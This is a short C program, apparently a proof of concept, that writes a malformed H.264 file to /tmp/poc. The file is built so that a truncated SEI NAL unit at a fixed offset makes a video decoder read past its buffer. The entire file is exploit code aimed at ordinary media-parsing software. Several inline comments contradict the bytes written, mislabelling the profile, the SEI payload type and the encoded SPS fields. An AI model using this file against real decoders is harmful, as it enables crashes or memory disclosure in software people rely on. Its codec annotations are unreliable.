#include <stdio.h>
#include <stdlib.h>

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    /* Write start code prefix for SPS */
    fputc(0x00, f);
    fputc(0x00, f);
    fputc(0x01, f);

    /* SPS NAL header: 0x67 (AVC baseline, nal_unit_type=7) */
    fputc(0x67, f);

    /* Minimal SPS payload (12 bytes): profile_idc=100, constraints=0, level_idc=20,
       seq_parameter_set_id=0, log2_max_frame_num=4, pic_order_cnt_type=0,
       max_num_ref_frames=1, gaps_in_frame_num=0, pic_width=352, pic_height=288,
       frame_cropping=0, vui_parameters=0 */
    fputc(0x64, f); /* profile_idc = 100 (High) */
    fputc(0x00, f); /* constraint_set0_flag=0, ... */
    fputc(0x14, f); /* level_idc = 20 */
    fputc(0x80, f); /* seq_parameter_set_id=0, log2_max_frame_num_minus4=0 */
    fputc(0x00, f); /* pic_order_cnt_type=0, log2_max_pic_order_cnt_lsb_minus4=0 */
    fputc(0x01, f); /* max_num_ref_frames=1 */
    fputc(0x00, f); /* gaps_in_frame_num_allowed_flag=0 */
    fputc(0x7f, f); /* pic_width_in_mbs_minus1 = 21 (352/16 - 1) */
    fputc(0x11, f); /* pic_height_in_map_units_minus1 = 17 (288/16 - 1) */
    fputc(0x00, f); /* frame_mbs_only_flag=1, mb_adaptive_frame_field=0, direct_8x8_inference=0 */
    fputc(0x00, f); /* frame_cropping_flag=0 */
    fputc(0x00, f); /* vui_parameters_present_flag=0 */

    /* Now we have written 3 (start code) + 1 (header) + 12 (payload) = 16 bytes.
       We need to fill up to offset 255994 (so that SEI NAL starts there).
       Total filler needed = 255994 - 16 = 255978 bytes.
       We'll write valid slice data or just zeros (decoder should accept zeros as
       valid bitstream filler after SPS). */
    size_t filler_len = 255994 - 16;
    for (size_t i = 0; i < filler_len; i++) {
        fputc(0x00, f);
    }

    /* Now at offset 255994. Write SEI NAL unit:
       - NAL header: 0x06 (nal_unit_type=6, nal_ref_idc=0)
       - Payload type: 0x01 (Film Grain Characteristics)
       - Payload size: 0x04 (request 4 bytes)
       Total: 3 bytes. File ends at offset 255997.
       The decoder will attempt to read 4 bytes starting at offset 255997,
       which will access indices 255997-256000. Index 256000 is out of bounds. */
    fputc(0x06, f); /* SEI NAL header */
    fputc(0x01, f); /* payload type = Film Grain Characteristics */
    fputc(0x04, f); /* payload size = 4 (no payload bytes follow) */

    fclose(f);
    return 0;
}